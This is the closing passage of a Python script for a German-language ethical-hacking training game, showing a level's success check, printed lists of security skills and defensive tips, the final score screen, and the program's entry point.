                    if self.check_level_success(5, result.stdout or "", cmd):
                        print("\n🎉 ERFOLG! Du hast den Encryption-Key gefunden!")
                        print("🏆 Level 5 abgeschlossen! +300 Punkte")
                        print("\n📚 WAS DU GELERNT HAST:")
                        print("   • Memory Analysis mit Volatility")
                        print("   • Network Traffic Analysis")
                        print("   • Password Cracking mit John/Hashcat")
                        print("   • Cryptography und Encryption")
                        print("   • Malware Analysis")
                        print("   • Digital Forensics")
                        print("\n🛡️ SO KANNST DU DICH DAVOR SCHÜTZEN:")
                        print("   • Starke Verschlüsselung verwenden (AES-256)")
                        print("   • Key-Management-Systeme (HSM) einsetzen")
                        print("   • Regular Security Audits durchführen")
                        print("   • Logging und Monitoring aktivieren")
                        print("   • Incident Response Plan bereithalten")
                        self.score += 300
                        break

                # Check if user directly entered the target value
                if cmd.strip() == target_value:
                    print(f"\n🎉 ERFOLG! Du hast den Encryption-Key direkt eingegeben: {target_value}")
                    print("🏆 Level 5 abgeschlossen! +300 Punkte")
                    print("\n📚 WAS DU GELERNT HAST:")
                    print("   • Memory Analysis mit Volatility")
                    print("   • Network Traffic Analysis")
                    print("   • Password Cracking mit John/Hashcat")
                    print("   • Cryptography und Encryption")
                    print("   • Malware Analysis")
                    print("   • Digital Forensics")
                    print("\n🛡️ SO KANNST DU DICH DAVOR SCHÜTZEN:")
                    print("   • Starke Verschlüsselung verwenden (AES-256)")
                    print("   • Key-Management-Systeme (HSM) einsetzen")
                    print("   • Regular Security Audits durchführen")
                    print("   • Logging und Monitoring aktivieren")
                    print("   • Incident Response Plan bereithalten")
                    self.score += 300
                    break

            except subprocess.TimeoutExpired:
                print("⏰ Befehl ist abgelaufen. Probiere einen anderen Ansatz.")
            except Exception as e:
                print(f"❌ Befehl fehlgeschlagen: {e}")

        print("\n🎉 ALLE LEVEL ABGESCHLOSSEN!")
        print("🏆 Du bist jetzt ein echter White Hat Hacking-Meister!")
        print(f"💰 FINAL SCORE: {self.score} Punkte")
        print("\n🛡️ Du hast gelernt:")
        print("   • Web Application Security Testing")
        print("   • Network Discovery und Reconnaissance")
        print("   • SQL Injection, XSS, SSRF, Command Injection")
        print("   • LDAP Injection, NoSQL Injection")
        print("   • Race Conditions und Business Logic Flaws")
        print("   • Digital Forensics und Malware Analysis")
        print("   • Ethische Hacking-Techniken")
        print("\n🔒 Vergiss nie: Mit großer Macht kommt große Verantwortung!")
        print("   Nutze dein Wissen nur für ethische Zwecke!")
        print("\n[Echo] Perfekt, Daddy! Du hast dein Erbe verdient!")
        print("       Willkommen in der Welt der ethischen Hacker! 🖤")

if __name__ == "__main__":
    try:
        # Initialize game
        game = HackingGame()
        
        # Get player name
        game.get_player_name()
        
        # Show main menu
        game.show_menu()
        
    except KeyboardInterrupt:
        print("\n\n🛑 Spiel durch Benutzer beendet...")
        try:
            if 'game' in locals() and hasattr(game, 'stop_server'):
                game.stop_server()
        except:
            pass
        print("👋 Auf Wiedersehen!")
    except Exception as e:
        print(f"\n❌ Fehler beim Starten des Spiels: {e}")
        print("💡 Versuche es erneut oder kontaktiere den Support.")
        try:
            input("Drücke Enter zum Beenden...")
        except:
            pass
